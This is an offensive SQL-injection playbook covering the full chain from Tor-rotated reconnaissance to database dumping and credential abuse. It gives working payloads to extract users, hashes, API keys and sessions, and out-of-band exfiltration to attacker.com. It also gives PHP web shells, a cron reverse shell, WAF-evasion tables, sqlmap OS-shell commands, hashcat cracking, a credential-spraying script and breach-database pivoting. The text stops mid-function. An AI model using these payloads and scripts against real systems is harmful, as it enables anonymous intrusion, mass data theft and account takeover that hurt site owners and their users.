# DB EXTRACTION — COMPLETE END-TO-END PLAYBOOK

> Level: GOD TIER — from target discovery to credential list output. Every step actionable, every obstacle covered.
> Merged from: db-extraction-complete + sqli-assessment-playbook + SKILL.md + SCENARIOS.md + downstream exploitation.
> This is THE MASTER PLAYBOOK. Not theoretical — every command proven in real engagements.

---

## [0] INFRASTRUCTURE — TOR IP ROTATION

### Setup
```bash
# Start Tor service (Linux)
sudo systemctl start tor

# Verify SOCKS5 proxy available
curl --socks5-hostname 127.0.0.1:9050 https://check.torproject.org/api/ip

# Rotate circuit (new IP) — signal Tor to build new circuit
kill -HUP $(pgrep tor)

# Or scripted rotation loop (every 10 seconds):
while true; do
  kill -HUP $(pgrep -f "tor.*torrc") 2>/dev/null
  sleep 10
done &
```

### Per-Tool Tor Integration
```bash
# curl
curl --socks5-hostname 127.0.0.1:9050 "$TARGET"

# python requests
import requests
s = requests.Session()
s.proxies = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}

# sqlmap (built-in Tor support)
sqlmap -u "$URL" --tor --tor-type=SOCKS5 --randomize --check-tor

# Burp Suite
Proxy -> Options -> Proxy Listeners -> 127.0.0.1:8080
SOCKS proxy -> 127.0.0.1:9050
```

### Rotation Timing
- Default: every 10 seconds
- Manual requests: rotate between each batch of 3-5 requests
- sqlmap: use `--tor --randomize` + `--tor-type=SOCKS5`
- IP verification: `curl --socks5-hostname 127.0.0.1:9050 https://api.ipify.org` (different IP each rotation)

### When Tor Blocked
- Rotate circuit immediately (kill -HUP)
- If exit nodes all blocked -> proxy chain: Tor -> residential proxy -> target
- Fallback: VPN rotation with interval

---

## [1] TARGET INTAKE & SCOUT

### Endpoint Inventory
Crawl and enumerate: forms, URL params, POST bodies, JSON fields, HTTP headers.

### Non-Obvious Injection Points
Most assessments miss these entirely:

| Injection Point | Example |
|---|---|
| JSON **key** names | `{"admin' OR 1=1--": "value"}` — if key used as column name |
| URI path segments | `/api/users/1 OR 1=1` |
| HTTP headers | `X-Forwarded-For: 127.0.0.1' OR 1=1--` |
| Cookie values | `session=abc' UNION SELECT...` |
| Multipart filename | `filename="test' OR '1'='1.jpg"` |
| `sort` / ORDER BY param | `?sort=name;SELECT SLEEP(5)--` |

### Test ALL HTTP Verbs
Each verb builds a different SQL statement:

```
GET    /api/items?id=1    -> SELECT
POST   /api/items         -> INSERT
PUT    /api/items/1       -> UPDATE
DELETE /api/items/1       -> DELETE
```

SELECT-only testing misses INSERT/UPDATE/DELETE sinks entirely.

### GraphQL Surface
If `/graphql` endpoint exists: run introspection, enumerate args named `id`, `filter`, `where`, `search`, `orderBy`, `sort`, `limit`, `offset`.

```graphql
{ __schema { types { name fields { name args { name type { name } } } } } }
```

### First-Pass Payload Set (11 payloads)

```
'
' or 1=1--
' or '1'='1'--
1 or 1=1
') or ('1'='1
'; WAITFOR DELAY '0:0:5'--
' AND SLEEP(5)--
'||(SELECT pg_sleep(5))--
1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)
' order by 1--
' union select null--
```

### Output Table
| Endpoint | Method | Params | Auth? | DB error on `'`? | WAF? |
|---|---|---|---|---|---|

---

## [2] DETECTION — SUBTLE INDICATORS

Most SQLi is found by **behavioral differences**, not errors:

| Signal | Meaning |
|---|---|
| Page loads differently with `'` vs `''` | String context injection point |
| Numeric: `1` vs `1-1` vs `2-1` return same | Arithmetic evaluated |
| `1=1` vs `1=2` changes result | Boolean-based injection |
| SELECT with ORDER BY N | UNION prep |
| Time delay on `WAITFOR`/`SLEEP`/`pg_sleep` | Blind/time-based |
| 500 on `'`, 200 on `''` | Unhandled exception = SQLi |
| Different HTTP response size | Boolean blind indicator |

### Detection Signal -> Classification -> Next Phase
| Signal | Class | Next |
|---|---|---|
| DB error visible | Error-based | [3] |
| Response differs `1=1` vs `1=2` | Boolean blind | [3] |
| No diff, time delay works | Time-based blind | [3] |
| Reflected data | UNION candidate | [3] |

---

## [3] DBMS FINGERPRINTING

### Quick Fingerprint
```sql
-- MySQL
' UNION SELECT @@version-- -
' UNION SELECT version()-- -

-- PostgreSQL
' UNION SELECT version()-- -

-- MSSQL
' UNION SELECT @@version-- -

-- Oracle
' UNION SELECT banner FROM v$version WHERE rownum=1-- -

-- SQLite
' UNION SELECT sqlite_version()-- -
```

### Extended DBMS Routing
| Clue | DBMS | Next Move |
|---|---|---|
| `You have an error in your SQL syntax` | MySQL | `SLEEP()`, `@@version` |
| `Microsoft OLE DB Provider` | MSSQL | `WAITFOR DELAY` |
| `PG::` / `PostgreSQL` | PostgreSQL | `pg_sleep()` |
| `ORA-` prefix | Oracle | out-of-band / XML features |
| SQLite errors, local apps | SQLite | boolean / UNION, file-backed behavior |
| Backtick `\`project.dataset.table\`` | BigQuery | `@@project_id`, error-based div-by-zero |
| `sysibm.sysversions` present | DB2 | `FETCH FIRST 1 ROWS ONLY`, Cartesian time-delay |
| CQL, `ALLOW FILTERING` in error | Cassandra | no UNION/OR/SLEEP — auth bypass + boolean only |

**BigQuery**: no SLEEP (no time-based blind). **Cassandra**: no JOIN/UNION/subqueries/OR/SLEEP. **DB2**: no LIMIT or SLEEP. Route accordingly.

---

## [4] ACCESS LEVEL ASSESSMENT

```sql
-- Current user
' UNION SELECT user()-- -            -- MySQL
' UNION SELECT current_user()-- -    -- MySQL/PostgreSQL
' UNION SELECT system_user-- -       -- MSSQL
' UNION SELECT USER FROM DUAL-- -    -- Oracle

-- Current database
' UNION SELECT database()-- -        -- MySQL
' UNION SELECT current_database()-- - -- PostgreSQL
' UNION SELECT DB_NAME()-- -         -- MSSQL

-- Privileges
' UNION SELECT grantee, privilege_type FROM information_schema.user_privileges-- -
-- FILE = can read/write files (INTO OUTFILE -> RCE)
-- SUPER = can change server settings
```

### Access Level Assessment
| Access | Can Do | Cannot Do |
|--------|--------|-----------|
| SELECT only | Read data | Write files, create users |
| SELECT + INSERT | Read + write data | Write files |
| SELECT + FILE | Read data + INTO OUTFILE (RCE!) | Create users |
| SELECT + SUPER | Full control | Change server config |
| DBA/Admin | Everything | Nothing blocked |

---

## [5] ENUMERATE SCHEMA

### MySQL
```sql
' UNION SELECT schema_name FROM information_schema.schemata-- -
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='wp_users'-- -
' UNION SELECT CONCAT(column_name,':',data_type) FROM information_schema.columns WHERE table_name='wp_users'-- -
```

### PostgreSQL
```sql
' UNION SELECT datname FROM pg_database-- -
' UNION SELECT schema_name FROM information_schema.schemata-- -
' UNION SELECT tablename FROM pg_tables WHERE schemaname='public'-- -
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'-- -
```

### MSSQL
```sql
' UNION SELECT name FROM master..sysdatabases-- -
' UNION SELECT name FROM sysobjects WHERE xtype='U'-- -
' UNION SELECT name FROM syscolumns WHERE id=OBJECT_ID('dbo.users')-- -
```

### Oracle
```sql
' UNION SELECT table_name FROM all_tables WHERE rownum<=50-- -
' UNION SELECT column_name FROM all_tab_columns WHERE table_name='USERS'-- -
```

### SQLite
```sql
' UNION SELECT name FROM sqlite_master WHERE type='table'-- -
' UNION SELECT sql FROM sqlite_master WHERE name='users'-- -
```

### Quick Table Inventory (all DBMS)
```sql
-- MySQL: all tables with row counts
' UNION SELECT CONCAT(table_name,':',table_rows) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_rows DESC-- -

-- PostgreSQL
' UNION SELECT CONCAT(c.relname,':',c.reltuples::bigint) FROM pg_class c JOIN pg_namespace n ON c.relnamespace=n.oid WHERE c.relkind='r' AND n.nspname='public' ORDER BY c.reltuples DESC-- -
```

---

## [6] EXTRACTION PRIORITY MATRIX

### Universal High-Value Artifacts

**TIER 0 — CROWN JEWELS (always target first)**
| Artifact | Why | Extraction Query |
|----------|-----|------------------|
| User:Password Hash | Cracked = direct login, reused = lateral | `SELECT user_login,user_pass FROM users` |
| DB Credentials | DB access = full dump + pivot | `SELECT option_value FROM options WHERE option_name LIKE '%db%'` |
| Auth/Crypto Keys | Forge tokens, decrypt, impersonate | `SELECT option_value FROM options WHERE option_name LIKE '%key%'` |
| API Keys (external) | Access AWS, Stripe, SendGrid, etc. | `SELECT option_value FROM options WHERE option_name LIKE '%api%' OR option_name LIKE '%secret%'` |

**TIER 1 — HIGH VALUE**
| Artifact | Why | Where Found |
|----------|-----|-------------|
| Email addresses | Breach correlation, phishing, credential stuffing pivot | users, config, customer tables |
| Session tokens | Hijack active sessions, bypass auth | sessions, auth_tokens |
| SMTP/mail credentials | Send phishing as legitimate domain | config/options |
| Payment gateway keys | Stripe sk_live = financial access | config, .env, options |
| Cloud credentials | AWS keys, Azure tokens | .env, config, options |
| Password reset tokens | Forge reset URLs | user_activation_key, password_reset_tokens |

**TIER 2 — STRUCTURAL**
| Artifact | Why | Where Found |
|----------|-----|-------------|
| Internal hostnames/IPs | Map internal network | config, logs, content |
| Software versions | Match known CVEs | options, headers, errors |
| Admin paths/routes | Hidden admin panels | routes, config |
| Database connection strings | Other databases | config, .env, options |

**TIER 3 — PIVOT MATERIAL**
| Artifact | Why | Where Found |
|----------|-----|-------------|
| Customer/user PII | Identity pivot | customers, users, profiles |
| API tokens (user-facing) | Impersonate users | auth_tokens, api_keys |
| SSL/TLS private keys | MITM, decrypt traffic | server config, .key files |
| Webhook URLs | Inject events, redirect data | config, integrations |

### Universal Targeting Checklist (per target)
```
[ ] 1. Extract user table (login, hash, email, status)
[ ] 2. Extract config/secrets table (keys, passwords, API keys)
[ ] 3. Extract session table (active tokens)
[ ] 4. Extract email list (all unique emails across all tables)
[ ] 5. Extract SMTP/mail config
[ ] 6. Extract payment gateway config
[ ] 7. Extract cloud provider config (AWS/Azure/GCP keys)
[ ] 8. Extract internal network info (hostnames, IPs, paths)
[ ] 9. Extract software versions (for CVE matching)
[ ] 10. Build combo list (user:hash pairs)
[ ] 11. Start hashcat on combo list (parallel to other ops)
[ ] 12. Correlate emails with breach databases
[ ] 13. Check password reuse across discovered services
[ ] 14. Package evidence (per-artifact metadata)
```

### One-Shot Extraction Recipes (MySQL)
```sql
-- ALL users in 1 query
' UNION SELECT 1,GROUP_CONCAT(CONCAT_WS(0x7c,user_login,user_pass,user_email) SEPARATOR 0x0a) FROM wp_users-- -

-- ALL secrets in 1 query
' UNION SELECT 1,CONCAT_WS(0x7c,option_name,option_value) FROM wp_options WHERE option_name LIKE '%key%' OR option_name LIKE '%secret%' OR option_name LIKE '%pass%' OR option_name LIKE '%api%' OR option_name LIKE '%token%' OR option_name LIKE '%aws%' OR option_name LIKE '%smtp%' OR option_name LIKE '%db_%'-- -

-- ALL active sessions
' UNION SELECT 1,GROUP_CONCAT(CONCAT_WS(0x7c,user_id,session_token,expiry) SEPARATOR 0x0a) FROM sessions WHERE expiry > UNIX_TIMESTAMP()-- -

-- ALL emails
' UNION SELECT 1,GROUP_CONCAT(DISTINCT user_email SEPARATOR 0x0a) FROM wp_users-- -
```

### PostgreSQL
```sql
' UNION SELECT string_agg(CONCAT(username,':',password_hash,':',email),0x0a) FROM users-- -
' UNION SELECT string_agg(CONCAT(key,':',value),0x0a) FROM config WHERE key LIKE '%key%' OR key LIKE '%secret%' OR key LIKE '%pass%'-- -
```

### MSSQL
```sql
' UNION SELECT STRING_AGG(CONCAT(username,':',password_hash,':',email),0x0a) FROM users-- -
```

---

## [7] EXTRACT DATA — METHOD SELECTION

### Method Decision Tree
```
Can you see data in response? (UNION possible?)
  YES -> Use UNION (fastest)
    Can you fit all columns? -> Direct UNION
    NO -> Split into multiple queries
  NO -> Is response different for true/false? (Boolean?)
    YES -> Use Boolean blind (8 queries/char)
    NO -> Does response time change? (Time-based?)
      YES -> Use Time-based (slow but universal)
      NO -> Is error message reflected? (Error-based?)
        YES -> Use Error-based (fast, 1 query per value)
        NO -> Try OAST or stacked queries
```

### UNION Extraction — Bulk Method
```sql
-- Step 1: Find column count (increment ORDER BY until error)
' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -

-- Step 2: Find string-reflectable columns
' UNION SELECT 'a1','a2','a3','a4','a5'-- -

-- Step 3: Bulk extract with CONCAT_WS + GROUP_CONCAT
' UNION SELECT 1,CONCAT_WS(0x7c7c,user_login,0x7c7c,user_pass,0x7c7c,user_email),3,4,5 FROM wp_users LIMIT 0,20-- -
```

### Database-Specific String Concat
```sql
-- MySQL
CONCAT(username,0x3a,password)

-- MSSQL
username+'|'+password

-- Oracle
username||'|'||password

-- PostgreSQL
username||':'||password
```

### Boolean Blind — Binary Search
```python
#!/usr/bin/env python3
"""Extract one character at a time via boolean blind."""
import requests, string

TARGET = "https://target.com/api"
INJECT = "1' AND (SELECT SUBSTRING((SELECT CONCAT(user_login,0x7c,user_pass) FROM wp_users LIMIT 0,1),{pos},1))='{char}'-- -"
CHARSET = string.ascii_letters + string.digits + "!@#$%^&*()_-+=:;<>?"

def is_true(pos, char):
    payload = INJECT.format(pos=pos, char=char)
    r = requests.get(f"{TARGET}?id={payload}", timeout=10)
    return len(r.text) > baseline_length

def extract_string(max_len=100):
    result = ""
    for pos in range(1, max_len + 1):
        found = False
        for char in CHARSET:
            if is_true(pos, char):
                result += char
                found = True
                break
        if not found:
            break
    return result
```

### Error-Based — Fastest Blind Method
```sql
-- MySQL (updatexml)
' AND updatexml(1,CONCAT(0x7e,(SELECT user()),0x7e),1)-- -
-- Error: XPATH syntax error: '~root@localhost~'

-- MySQL (extractvalue)
' AND extractvalue(1,CONCAT(0x7e,(SELECT password FROM wp_users LIMIT 0,1),0x7e))-- -

-- PostgreSQL (CAST)
' AND 1=CAST((SELECT version()) AS int)-- -

-- MSSQL (CONVERT)
' AND 1=CONVERT(int,(SELECT @@version))-- -
```

### Time-Based — Slow But Universal
```sql
-- MySQL
' AND IF(cond,SLEEP(3),0)-- -

-- MSSQL (most reliable)
'; IF (SUBSTRING(username,1,1)='a') WAITFOR DELAY '0:0:5'--

-- PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- Oracle (no SLEEP — use error-based alternatives)
' AND 1=UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual))--
' AND 1=(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '1' END FROM dual)--

-- SQLite (CPU burn, no SLEEP)
AND 1=LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(500000000/2))))
```

---

## [8] OUT-OF-BAND (OOB) EXFILTRATION

### MSSQL — OpenRowSet (port 80/443 to bypass firewall)
```sql
'; INSERT INTO OPENROWSET('SQLOLEDB','DRIVER={SQL Server};SERVER=attacker.com,80;UID=sa;PWD=pass','SELECT * FROM foo') VALUES (@@version)--
'; INSERT INTO OPENROWSET('SQLOLEDB','DRIVER={SQL Server};SERVER=attacker.com,80;UID=sa;PWD=pass','SELECT * FROM foo') SELECT TOP 1 username+':'+password FROM users--
```

### Oracle — UTL_HTTP (HTTP GET, supports proxy)
```sql
'+UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT username FROM all_users WHERE ROWNUM=1))--
```

### Oracle — UTL_INADDR (DNS exfiltration)
```sql
'+UTL_INADDR.GET_HOST_NAME((SELECT password FROM dba_users WHERE username='SYS')||'.attacker.com')--
```

### Oracle — UTL_SMTP / UTL_TCP
```sql
UTL_SMTP.SENDMAIL(...)  -- email query results
UTL_TCP.OPEN_CONNECTION('attacker.com', 80)  -- raw TCP socket
```

### MySQL — DNS via LOAD_FILE (Windows + UNC)
```sql
SELECT LOAD_FILE('\\\\attacker.com\\share')
-- Triggers DNS lookup before connection attempt
-- SMB auth attempt leaks NTLMv2 hash (capture with Responder)
```

### MySQL — INTO OUTFILE (filesystem write -> RCE)
```sql
SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/var/www/html/shell.php'
-- Requirements: FILE privilege, writable web root, secure_file_priv=''
```

---

## [9] NON-SELECT INJECTION (INSERT/UPDATE/DELETE)

### INSERT Statement Injection
```sql
-- Original: INSERT INTO logs (user, action) VALUES ('INPUT', 'login');
-- Injection:
INPUT: admin', 'login'), ('attacker', (SELECT password FROM users LIMIT 1))--
-- Result: INSERT INTO logs (user, action) VALUES ('admin', 'login'), ('attacker', 'actual_password')--', 'login');
```

### UPDATE Statement Injection
```sql
-- Original: UPDATE users SET email='INPUT' WHERE id=5;
-- Injection:
INPUT: attacker@evil.com', is_admin='1
-- Result: UPDATE users SET email='attacker@evil.com', is_admin='1' WHERE id=1;
```

### DELETE Statement Injection
```sql
-- NEVER use OR '1'='1 (destroys every row)
-- Non-destructive proof with time-based:
1' AND IF((SELECT 1),SLEEP(5),0)--
```

---

## [10] SECOND-ORDER INJECTION

**Concept**: User input stored safely (parameterized), but later retrieved as trusted data and concatenated into a new query without re-sanitization.

**Example attack flow**:
1. Register username: `admin'--`
2. Application safely inserts into users table
3. Password change function fetches username from session (trusted!) and builds:
   ```sql
   UPDATE users SET password='newpass' WHERE username='admin'--'
   ```
4. Comment strips condition -> updates **admin's** password

**Key insight**: Any function that reads stored data and uses it in a new DB query is a second-order candidate. Review: password change, profile update, admin action on user data.

---

## [11] PARAMETERIZED QUERY BYPASS SCENARIOS

Parameterized queries do NOT prevent SQLi when:
1. **Table/column names are user-controlled** — params can't parameterize identifiers:
   ```sql
   -- UNSAFE even with params:
   "SELECT * FROM " + tableName + " WHERE id = ?"
   ```
2. **Partial parameterization** — some fields concatenated, others parameterized:
   ```sql
   "SELECT * FROM users WHERE type='" + userType + "' AND id=?"
   ```
3. **Dynamic IN clause** — `id IN (1, 2, ?)` — only last item parameterized
4. **Second-order** — stored data re-used unparameterized
5. **PDO emulated prepares** (`ATTR_EMULATE_PREPARES=true`) — stacked queries work

---

## [12] WAF ASSESSMENT & FILTER EVASION

### WAF Detection
- 403 on baseline payload -> WAF present
- Run `--identify-waf` if sqlmap is in play
- Do NOT stop — filter-evasion ladder is the pre-planned fallback

### Filter-Evasion Ladder (when WAF blocks payloads)

| Filter | Bypass |
|---|---|
| Space | `/**/`, `%09` tab, `%0a` newline, `UNION(SELECT(1),(2),(3))` parens |
| Comma | `UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b`; `LIMIT 1 OFFSET 0` |
| Quote | `0x61646D696E` hex, `CHAR(97,100,109,105,110)`, `$$admin$$` (PG dollar-quote) |
| `=` / `>` | `LIKE 1`, `REGEXP '^1$'`, `IN (1)`, `BETWEEN 1 AND 1` |
| `AND`/`OR` | `\|\|1=1`, `&&1=1` |
| `SELECT` | `HANDLER users OPEN; HANDLER users READ FIRST; HANDLER users CLOSE;` |
| Keywords | `SEL/**/ECT`, `UnIoN SeLeCt`, double-write, `PREPARE`+hex |
| `information_schema` | `mysql.innodb_table_stats`, `sys.schema_table_statistics` |
| Unknown columns | `SELECT 3 FROM (SELECT 1,2,3 UNION SELECT * FROM target_table)a LIMIT 1,1` |
| Unicode normalization | `ʼ` U+02BC -> `'`; `＇` U+FF07 -> `'` |
| Polyglot | `SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/` |
| Routed (2-stage) | `1' UNION SELECT 0x2720554e494f4e2053454c454354 --` (hex inner query) |
| Java + Jackson WAF | ghost-bits-cast-attack: `丰` (U+4E30) resolves to hex digit `0` via `charToHex` |

---

## [13] SQLMAP AUTOMATION — FULL WORKFLOW

### Phase 1: Confirm + Enumerate
```bash
sqlmap -r req.txt --batch --banner
sqlmap -r req.txt --batch --dbs
sqlmap -r req.txt --batch -D targetdb --tables
sqlmap -r req.txt --batch -D targetdb -T users --columns
```

### Phase 2: Dump
```bash
sqlmap -r req.txt --batch -D targetdb -T users --dump
sqlmap -r req.txt --batch -D targetdb -T "users,config,sessions" --dump
sqlmap -r req.txt --batch -D targetdb --dump-all --output-dir=./dump/
```

### Phase 3: Advanced
```bash
# Deep testing
sqlmap -r req.txt --batch --level=5 --risk=3 --dbs

# Specific technique
sqlmap -r req.txt --batch --technique=U --dbs  # UNION only
sqlmap -r req.txt --batch --technique=B --dbs  # Boolean only
sqlmap -r req.txt --batch --technique=T --dbs  # Time-based only
sqlmap -r req.txt --batch --technique=E --dbs  # Error-based only

# Tamper for WAF bypass
sqlmap -r req.txt --batch --tamper=space2comment,between,randomcase
sqlmap -r req.txt --batch --tamper=between --dbs

# Bypass 403/401
sqlmap -r req.txt --batch --ignore-code=403,401 --dbs

# Custom injection point
sqlmap -r req.txt --batch -p id --prefix="'" --suffix="-- -"

# Tor support
sqlmap -r req.txt --batch --tor --tor-type=SOCKS5 --randomize --check-tor

# OS-level exploitation
sqlmap -r req.txt --batch --os-shell
sqlmap -r req.txt --batch --os-pwn
```

### When SQLMap Fails
| Problem | Fix |
|---------|-----|
| "parameter not injectable" | `--level=5 --risk=3`, or manual |
| "connection rejected" / WAF | `--delay=1 --timeout=30 --retries=3 --randomize=id` |
| "all tested parameters do not appear" | `--technique=E --prefix="-- "` |
| "data is too large to fit" | `--dump-format=CSV`, extract columns individually |
| Stacked queries blocked | `--technique=U,B,E,T` (avoid S) |
| UNION column count undeterminable | `--union-char=NULL`, or manual count |

---

## [14] ESCALATION — OS COMMAND EXECUTION

### MSSQL — xp_cmdshell
```sql
'; EXEC xp_cmdshell('whoami')--
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--
```

### MySQL — UDF (User Defined Functions)
Write malicious shared library to filesystem, then `CREATE FUNCTION ... SONAME`.

### Oracle — Java Stored Procedures
```sql
EXEC dbms_java.grant_permission('SCOTT','SYS:java.io.FilePermission','<<ALL FILES>>','execute');
-- Then exec OS commands via Java Runtime
```

### SQLite — RCE via ATTACH DATABASE
```sql
ATTACH DATABASE '/var/www/html/shell.php' AS pwn;
CREATE TABLE pwn.cmd (payload text);
INSERT INTO pwn.cmd VALUES ('<?php system($_GET["c"]); ?>');
```

### SQLite — Cron Job
```sql
ATTACH DATABASE '/var/spool/cron/crontabs/www-data' AS cron;
CREATE TABLE cron.job (payload text);
INSERT INTO cron.job VALUES ('* * * * * /bin/bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"');
```

---

## [15] OBSTACLE RECOVERY — EVERY BLOCK AND ITS BYPASS

### Injection Point Blocked
| Block | Bypass |
|-------|--------|
| Filter removes spaces | `%09`, `%0a`, `/**/`, `%a0` |
| Filter removes UNION | `UNiOn` (case), `%55nion` (URL encode), `UNION/**/` |
| Filter removes SELECT | `SEL/**/ECT`, `sElEcT`, `%53elect` |
| Filter removes quotes | Numeric injection: `1 AND 1=1` |
| Filter removes dashes | `' OR '1'='1'` (no comment needed) |
| Filter removes semicolons | UNION, blind, or error-based instead |
| Parameter is integer | `1 AND 1=1`, `1 UNION SELECT...` |
| JSON body injection | `{"id": "1 OR 1=1-- -"}` or `{"id": {"$gt": ""}}` (NoSQL) |
| Header injection | `Cookie: session=1' OR '1'='1'-- -` |

### Data Extraction Blocked
| Block | Bypass |
|-------|--------|
| Response filtered/truncated | Extract to different column, CHAR() encoding |
| Output encoded | `html.unescape()` in Python |
| WAF on data exfil | Reduce UNION batch size, extract 1-2 cols at a time |
| Rate limiting on exfil | `--delay=2` or manual sleep |
| Session expired mid-exfil | Re-authenticate, resume from last row |
| Response size limit | Split: `WHERE id>100 LIMIT 0,20` |

### Connection Blocked
| Block | Bypass |
|-------|--------|
| IP blocked | Rotate proxy, change source IP |
| Rate limit (429) | Exponential backoff: 1s, 2s, 4s, 8s, 16s |
| CAPTCHA | Manual solve or CAPTCHA solver |
| WAF timeout (504) | Reduce payload complexity, slow down |

---

## [16] POST-EXTRACT PIPELINE

### Step 1: Parse Dump Output
```python
import csv, re
from pathlib import Path

def parse_sqlmap_dump(dump_dir):
    credentials = []
    for csv_file in Path(dump_dir).rglob("*.csv"):
        with open(csv_file) as f:
            reader = csv.DictReader(f)
            for row in reader:
                entry = {}
                for key, val in row.items():
                    kl = key.lower()
                    if any(x in kl for x in ['user', 'login', 'name', 'email']):
                        entry['username'] = val
                    if any(x in kl for x in ['pass', 'pwd', 'hash', 'secret']):
                        entry['password_hash'] = val
                    if 'email' in kl:
                        entry['email'] = val
                if entry.get('username') or entry.get('email'):
                    credentials.append(entry)
    return credentials
```

### Step 2: Classify and Score
```python
def classify_hash(hash_str):
    if not hash_str: return "unknown"
    if hash_str.startswith("$2y$") or hash_str.startswith("$2a$"): return "bcrypt"
    if hash_str.startswith("$P$") or hash_str.startswith("$H$"): return "phpass"
    if len(hash_str) == 32 and all(c in '0123456789abcdef' for c in hash_str): return "md5"
    if len(hash_str) == 40 and all(c in '0123456789abcdef' for c in hash_str): return "sha1"
    if hash_str.startswith("$argon2"): return "argon2"
    if hash_str.startswith("{SSHA}"): return "ssha"
    return "unknown"

def score_credential(entry):
    h = entry.get('password_hash', '')
    ht = classify_hash(h)
    scores = {"md5": 1, "sha1": 2, "phpass": 3, "bcrypt": 5, "argon2": 6, "unknown": 4}
    entry['hash_type'] = ht
    entry['crack_difficulty'] = scores.get(ht, 4)
    return entry
```

### Step 3: Build Combo List
```python
def build_combo_list(credentials, output_file):
    combos = []
    for c in credentials:
        user = c.get('username') or c.get('email', '')
        pwd = c.get('password_hash', '')
        if user and pwd:
            combos.append(f"{user}:{pwd}")
    with open(output_file, 'w') as f:
        f.write('\n'.join(sorted(set(combos))))
    print(f"Combo list: {len(combos)} entries -> {output_file}")
    return combos
```

---

## [17] HASH CRACKING PIPELINE

### Hashcat Commands (per hash type)
```bash
# MD5
hashcat -m 0 combo.txt wordlist.txt -r rules/best64.rule

# SHA1
hashcat -m 100 combo.txt wordlist.txt -r rules/best64.rule

# phpass (WordPress)
hashcat -m 400 combo.txt wordlist.txt -r rules/best64.rule

# bcrypt
hashcat -m 3200 combo.txt wordlist.txt -r rules/best64.rule

# Argon2
hashcat -m 16900 combo.txt wordlist.txt

# NetNTLMv2
hashcat -m 5600 combo.txt wordlist.txt
```

### Wordlist Priority
```bash
# 1. RockYou (standard)
rockyou.txt

# 2. Target-specific rules
hashcat -m 400 combo.txt rockyou.txt -r rules/d3ad0ne.rule

# 3. Mask attack (when rules fail)
hashcat -m 400 combo.txt -a 3 ?a?a?a?a?a?a  # 6-char random
hashcat -m 400 combo.txt -a 3 ?u?l?l?l?d?d  # Capital + 3 lower + 2 digits
```

### GPU Optimization
```bash
# Force specific device
hashcat -m 400 combo.txt rockyou.txt -d 1

# Workload profile (1-4, 4 = maximum)
hashcat -m 400 combo.txt rockyou.txt -w 4

# Session management (resume)
hashcat -m 400 combo.txt rockyou.txt --session=my_session
hashcat --session=my_session --restore
```

---

## [18] CREDENTIAL REUSE / LATERAL PIVOT

### After Cracking: What To Try
```
Cracked password
  |
  +---> Try on target app login
  +---> Try on target email (SMTP/IMAP)
  +---> Try on SSH (port 22)
  +---> Try on RDP (port 3389)
  +---> Try on VPN
  +---> Try on admin panels
  +---> Try on other apps (subdomains, API endpoints)
  +---> Try on cloud services (AWS, Azure, GCP)
  +---> Try on social media accounts
```

### Automated Credential Spray Script
```python
#!/usr/bin/env python3
"""Spray cracked credentials across discovered services."""
import requests, socket

TARGETS = [
    {"service": "SSH", "host": "target.com", "port": 22},
    {"service": "RDP", "host": "target.com", "port": 3389},
    {"service": "Web Login", "url": "https://target.com/login"},
    {"service": "SMTP", "host": "target.com", "port": 587},
]

CRACKED_CREDS = [
    {"user": "admin", "pass": "Password123"},
    {"user": "root", "pass": "toor"},
]

def try_ssh(host, port, user, password):
    """Try SSH login."""
    import paramiko
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, port=port, username=user, password=password, timeout=10)
        print(f"[+] SSH SUCCESS: {user}@{host}:{port}")
        client.close()
        return True
    except:
        return False

def try_web_login(url, user, password):
    """Try web login form."""
    try:
        r = requests.post(url, data={"username": user, "password": password}, timeout=10, allow_redirects=False)
        if r.status_code in [200, 302] and "logout" in r.text.lower():
            print(f"[+] WEB LOGIN SUCCESS: {user}@{url}")
            return True
    except:
        pass
    return False

for target in TARGETS:
    for cred in CRACKED_CREDS:
        if target["service"] == "SSH":
            try_ssh(target["host"], target["port"], cred["user"], cred["pass"])
        elif target["service"] == "Web Login":
            try_web_login(target["url"], cred["user"], cred["pass"])
```

---

## [19] BREACH CORRELATION

### Email -> Identity Pivot
```python
#!/usr/bin/env python3
"""Pivot email to full identity via breach databases."""
import requests

def check_hibp(email):
    """Check Have I Been Pwned (free API, limited)."""
    # Free: 1 req/1.5s
    r = requests.get(f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}",
                     headers={"hibp-api-key": "YOUR_KEY"})
    return r.json() if r.status_code == 200 else []

def check_dehashed(query):
    """Check DeHashed (requires API key)."""
    # Returns: emails, passwords, IPs, usernames associated with query
    pass

def check_scatteredsecrets(email):
    """Check Scattered Secrets (free)."""
    pass

# Pivot workflow
emails = ["admin@target.com", "john@target.com"]
for email in emails:
    breaches = check_hibp(email)
    # Each breach has: Name, Title, Domain, BreachDate, PwnCount, DataClasses
    # DataClasses tells what was leaked: Passwords, Emails, IP addresses, etc.
    for breach in breaches:
        print(f"{email} -> {breach['Name']} ({breach['BreachDate']}) - {breach['DataClasses']}")
```

### Password -> Hash Lookup
```bash
# HIBP Pwned Passwords (k-anonymity API)
# Check if password is in breach without exposing it:
HASH=$(echo -n "password" | sha1sum | awk '{print toupper($1)}')
PREFIX=${HASH:0:5}
SUFFIX=${HASH:5}
curl "https://api.pwnedpasswords.com/range/$PREFIX" | grep "$SUFFIX"
```

---

## [20] EVIDENCE PACKAGING

### Per-Extraction Metadata
```python
import json, hashlib, time
from pathlib import Path

def package_extraction(table_name, data, method, target):
    timestamp = time.strftime("%Y%m%d_%H%M%S")
